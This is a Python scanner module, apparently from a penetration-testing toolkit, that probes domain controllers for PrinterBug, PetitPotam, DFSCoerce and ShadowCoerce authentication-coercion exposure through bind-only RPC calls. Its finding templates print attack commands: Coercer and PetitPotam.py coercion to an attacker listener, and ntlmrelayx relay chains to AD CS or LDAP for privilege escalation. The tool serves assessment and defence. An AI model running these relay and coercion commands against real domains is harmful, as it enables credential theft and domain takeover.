"""
Coercion-vector enumeration.

For every DC enumerated from the directory, attempt an RPC *bind* (no
method call) on each of the four interfaces that drive Microsoft-known
authentication-coercion attacks:

  MS-RPRN     PrinterBug      ``\\pipe\\spoolss``
  MS-EFSR     PetitPotam      ``\\pipe\\efsrpc`` (also ``\\pipe\\lsarpc``)
  MS-DFSNM    DFSCoerce       ``\\pipe\\netdfs``
  MS-FSRVP    ShadowCoerce    ``\\pipe\\FssagentRpc``

A successful bind = the interface is exposed and the named pipe is
listening = the coercion technique is feasible. We deliberately **do
not call the coercion methods themselves** — that requires an
attacker-controlled relay listener, generates Windows Event 5145, and
on a hardened DC produces audit noise the operator hasn't consented to.
The bind alone is silent (no Event 5145).

Compound finding: if **MS-EFSR is exposed AND an LDAP signing
enforcement check fails** (legacy `LDAPSigning` module), the full ESC8
relay chain is ready (PetitPotam → ntlmrelayx to LDAP → DCSync). That
combination escalates to CRITICAL.

Reference:
- Coercer (p0dalirius): https://github.com/p0dalirius/Coercer
- Unit 42 — Authentication Coercion Keeps Evolving
- Brief landscape research §1 (the 2024-2026 vector list)
"""

from __future__ import annotations

from dataclasses import dataclass

from kerb_map.ldap_helpers import attr
from kerb_map.plugin import Finding, Module, ScanContext, ScanResult, register

# ────────────────────────────────────────────────────────────────────── #
#  Coercion vector definitions                                           #
# ────────────────────────────────────────────────────────────────────── #


@dataclass(frozen=True)
class CoercionVector:
    """One named-pipe + UUID combo we'll try to bind to."""
    technique:    str   # 'PrinterBug', 'PetitPotam', etc. — operator-readable
    interface_uuid: str
    interface_version: str
    pipe:         str   # named pipe name (with leading \\pipe\\)
    description:  str   # one-line operator notes
    cve_id:       str = ""    # optional CVE / advisory


# These UUIDs / versions come straight from the MS-* protocol specs.
VECTORS = (
    CoercionVector(
        technique="PrinterBug",
        interface_uuid="12345678-1234-ABCD-EF00-0123456789AB",
        interface_version="1.0",
        pipe=r"\pipe\spoolss",
        description="MS-RPRN exposed — RpcRemoteFindFirstPrinterChangeNotificationEx triggers DC auth to attacker.",
    ),
    CoercionVector(
        technique="PetitPotam",
        interface_uuid="C681D488-D850-11D0-8C52-00C04FD90F7E",
        interface_version="1.0",
        pipe=r"\pipe\efsrpc",
        description="MS-EFSR (efsrpc pipe) — EfsRpcOpenFileRaw / EfsRpcEncryptFileSrv coerce DC auth.",
        cve_id="CVE-2021-36942",
    ),
    CoercionVector(
        technique="PetitPotam (lsarpc fallback)",
        interface_uuid="C681D488-D850-11D0-8C52-00C04FD90F7E",
        interface_version="1.0",
        pipe=r"\pipe\lsarpc",
        description="MS-EFSR over lsarpc — same coercion, alternate pipe (works pre-Aug-2021 patch).",
        cve_id="CVE-2021-36942",
    ),
    CoercionVector(
        technique="DFSCoerce",
        interface_uuid="4FC742E0-4A10-11CF-8273-00AA004AE673",
        interface_version="3.0",
        pipe=r"\pipe\netdfs",
        description="MS-DFSNM — NetrDfsRemoveStdRoot coerces DC auth.",
    ),
    CoercionVector(
        technique="ShadowCoerce",
        interface_uuid="A8E0653C-2744-4389-A61D-7373DF8B2292",
        interface_version="1.0",
        pipe=r"\pipe\FssagentRpc",
        description="MS-FSRVP — IsPathSupported / IsPathShadowCopied coerce DC auth.",
    ),
)


# ────────────────────────────────────────────────────────────────────── #
#  RPC bind probe                                                        #
# ────────────────────────────────────────────────────────────────────── #


def probe_rpc_interface(
    target:         str,
    vector:         CoercionVector,
    *,
    timeout:        int = 5,
    auth_callback:  callable | None = None,
) -> tuple[bool, str]:
    """Try to bind to ``vector.interface_uuid`` over the named pipe at
    ``vector.pipe`` on ``target``. Return ``(available, detail)``.

    ``available`` is True iff the bind succeeded — meaning the named
    pipe exists and the interface is registered. We deliberately do
    NOT invoke the coercion method that would actually trigger DC auth
    (and the corresponding 5145 event); the bind itself is silent.

    ``auth_callback(transport)`` is for tests — production callers can
    leave it None to use the operator's existing kerberos ticket. The
    callback receives the transport object before bind() is called and
    can apply credentials.
    """
    # Lazy-imported so the rest of the module loads on machines without
    # impacket installed (which kerb-map's dependency manifest requires
    # but operators sometimes strip).
    try:
        from impacket.dcerpc.v5 import transport
        from impacket.dcerpc.v5.dcomrt import DCERPCException  # noqa: F401
    except ImportError as e:
        return (False, f"impacket DCE/RPC machinery missing: {e}")

    binding = rf"ncacn_np:{target}[{vector.pipe}]"
    try:
        rpc_transport = transport.DCERPCTransportFactory(binding)
        rpc_transport.set_connect_timeout(timeout)
        if auth_callback:
            auth_callback(rpc_transport)
        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        try:
            from impacket.uuid import uuidtup_to_bin
            dce.bind(uuidtup_to_bin((vector.interface_uuid, vector.interface_version)))
        finally:
            try:
                dce.disconnect()
            except Exception:    # noqa: BLE001 - cleanup
                pass
        return (True, "bound")
    except Exception as e:        # noqa: BLE001 - any RPC error = "not available"
        return (False, _summarise_exception(e))


def _summarise_exception(exc: BaseException) -> str:
    """Cap RPC error strings so a verbose nca_s_unk_if doesn't pollute
    the JSON export. The class name + first 80 chars is plenty of
    signal for the operator to grep."""
    msg = str(exc).split("\n", 1)[0]
    return f"{type(exc).__name__}: {msg[:80]}"


# ────────────────────────────────────────────────────────────────────── #
#  Module                                                                #
# ────────────────────────────────────────────────────────────────────── #


@register
class CoercionVectors(Module):
    name        = "Coercion Vectors (PrinterBug / PetitPotam / DFSCoerce / ShadowCoerce)"
    flag        = "coercion"
    description = "Probe DC RPC interfaces to map authentication-coercion attack surface"
    category    = "attack-path"

    # RPC bind generates a transient TCP/SMB connection but **no** Event
    # 5145 — that event fires on file access during the coercion method
    # itself, which we don't call. Even so, gate behind --aggressive so
    # operators in deeply-paranoid environments can opt out.
    requires_aggressive = True
    in_default_run      = True

    def scan(self, ctx: ScanContext) -> ScanResult:
        dcs = self._enumerate_dcs(ctx)
        if not dcs:
            return ScanResult(raw={
                "applicable": False,
                "reason":     "no domain controllers enumerated from LDAP",
            })

        # Probe every (DC, vector) pair. Sequential — there are typically
        # 1–3 DCs and 5 vectors, so 5–15 short binds. Not worth threading.
        results: list[dict] = []
        findings: list[Finding] = []
        for dc in dcs:
            target = dc.get("dnsHostName") or dc.get("name") or ctx.dc_ip
            for vector in VECTORS:
                available, detail = probe_rpc_interface(target, vector)
                results.append({
                    "dc":             dc.get("name"),
                    "target":         target,
                    "technique":      vector.technique,
                    "interface_uuid": vector.interface_uuid,
                    "pipe":           vector.pipe,
                    "available":      available,
                    "detail":         detail,
                })
                if available:
                    findings.append(self._finding_for_vector(ctx, target, vector))

        # Compound: any PetitPotam pipe + LDAP signing not enforced =
        # ESC8 relay ready. We don't have direct visibility into LDAP
        # signing here (the legacy LDAPSigning CVE module covers it),
        # so emit an info-grade compound that the Scorer will correlate.
        petitpotam_available = any(
            r["available"] and r["technique"].startswith("PetitPotam")
            for r in results
        )
        if petitpotam_available:
            findings.append(Finding(
                target=ctx.domain,
                attack="PetitPotam → ESC8 relay ready (compound)",
                severity="CRITICAL",
                priority=94,
                reason=(
                    "MS-EFSR is exposed on at least one DC and the legacy "
                    "LDAPSigning CVE module's check should be cross-referenced; "
                    "if signing is not enforced, the full PetitPotam → "
                    "ntlmrelayx → AD CS HTTP enrollment (ESC8) chain is ready."
                ),
                next_step=(
                    "# Confirm signing on the DC:\n"
                    f"# (look for the LDAPSigning finding from --cves)\n"
                    "# Then end-to-end:\n"
                    "ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp "
                    "--adcs --template Machine\n"
                    f"python3 PetitPotam.py <attacker_ip> {ctx.dc_ip}"
                ),
                category="attack-path",
                mitre="T1187",
                data={
                    "domain_sid":  ctx.domain_sid,
                    "petitpotam_available": True,
                },
            ))

        return ScanResult(
            raw={
                "applicable":  True,
                "dcs_probed":  [r["dc"] for r in results if r["dc"]],
                "results":     results,
                "summary": {
                    "vectors_total": len(results),
                    "vectors_available": sum(1 for r in results if r["available"]),
                    "techniques_available": sorted({
                        r["technique"] for r in results if r["available"]
                    }),
                },
            },
            findings=findings,
        )

    # ------------------------------------------------------------------ #
    #  DC enumeration                                                    #
    # ------------------------------------------------------------------ #

    def _enumerate_dcs(self, ctx: ScanContext) -> list[dict]:
        """Pull every DC from the directory. We use the
        primaryGroupID=516 (Domain Controllers) filter rather than
        looking at the Configuration NC because it works on Samba and
        Windows alike."""
        entries = ctx.ldap.query(
            search_filter="(&(objectClass=computer)(primaryGroupID=516))",
            attributes=["sAMAccountName", "dNSHostName",
                        "operatingSystem", "name"],
        )
        out: list[dict] = []
        for e in entries:
            out.append({
                "name":             attr(e, "name") or attr(e, "sAMAccountName"),
                "dnsHostName":      attr(e, "dNSHostName"),
                "operatingSystem":  attr(e, "operatingSystem"),
            })
        return out

    # ------------------------------------------------------------------ #
    #  Finding rendering                                                 #
    # ------------------------------------------------------------------ #

    @staticmethod
    def _finding_for_vector(ctx: ScanContext, target: str, vector: CoercionVector) -> Finding:
        coercer_flag = {
            "PrinterBug":   "ms-rprn",
            "PetitPotam":   "ms-efsr",
            "PetitPotam (lsarpc fallback)": "ms-efsr",
            "DFSCoerce":    "ms-dfsnm",
            "ShadowCoerce": "ms-fsrvp",
        }.get(vector.technique, vector.technique.lower())

        return Finding(
            target=target,
            attack=f"Coercion: {vector.technique}",
            severity="HIGH",
            priority=85,
            reason=(
                f"{target} exposes {vector.technique} ({vector.pipe}). "
                f"{vector.description} {('CVE: ' + vector.cve_id) if vector.cve_id else ''}"
            ).strip(),
            next_step=(
                f"# Confirm with Coercer:\n"
                f"Coercer.py coerce -l <attacker_ip> -t {target} "
                f"-u {{operator_user}} -p {{operator_pass}} -d {ctx.domain} "
                f"--filter-method-name '{coercer_flag}'\n"
                f"# Pair with ntlmrelayx for end-to-end:\n"
                f"ntlmrelayx.py -t ldap://<other_dc> --escalate-user "
                f"<attacker_account> --no-smb-server --http-port 80"
            ),
            category="attack-path",
            mitre="T1187",   # Forced Authentication
            data={
                "interface_uuid": vector.interface_uuid,
                "pipe":           vector.pipe,
                "technique":      vector.technique,
                "cve_id":         vector.cve_id,
                "domain_sid":     ctx.domain_sid,
            },
        )
